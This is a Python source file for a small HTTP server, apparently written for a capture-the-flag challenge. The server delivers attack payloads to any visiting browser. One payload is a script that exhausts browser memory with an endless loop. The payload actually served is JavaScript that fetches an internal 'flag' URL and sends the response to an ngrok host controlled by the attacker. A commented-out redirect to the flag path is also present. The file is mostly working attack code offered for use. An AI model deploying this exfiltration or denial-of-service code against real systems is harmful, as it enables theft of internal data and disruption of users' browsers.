# Python 3 server example
# https://pythonbasics.org/webserver/
from http.server import BaseHTTPRequestHandler, HTTPServer
import time

hostName = "localhost"
serverPort = 8888

payload = """
<script>
txt = "a";
while(1){
    txt = txt += "a";    //add as much as the browser can handle
}
</script>
"""

payload = """
<script>
    var target = "http://37be-116-14-150-8.ngrok.io/?xmltest";
    //var target = "http://app/flag";
    var exfiltrate = "http://37be-116-14-150-8.ngrok.io/?data=";
    
    //window.open('target, 'flagWindow');
    
    var xhttp = new XMLHttpRequest();
    xhttp.onreadystatechange = function() {
        var exf = new XMLHttpRequest();
        exf.onreadystatechange = function() {};
        exf.open("GET", exfiltrate+xhttp.responseText, true);
        exf.send();
    };
    xhttp.open("GET", target, true);
    xhttp.send();
</script>
"""

class MyServer(BaseHTTPRequestHandler):
    def do_GET(self):
        # https://gist.github.com/kwilczynski/03edf1d97408fb0758b821f5223bd027
        '''
        self.send_response(301)
        new_path = '%s%s'%('http://app/flag', self.path)
        self.send_header('Location', new_path)
        self.end_headers()
        '''
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(bytes(payload, "utf-8"))
        #'''

if __name__ == "__main__":        
    webServer = HTTPServer((hostName, serverPort), MyServer)
    print("Server started http://%s:%s" % (hostName, serverPort))

    try:
        webServer.serve_forever()
    except KeyboardInterrupt:
        pass

    webServer.server_close()
    print("Server stopped.")
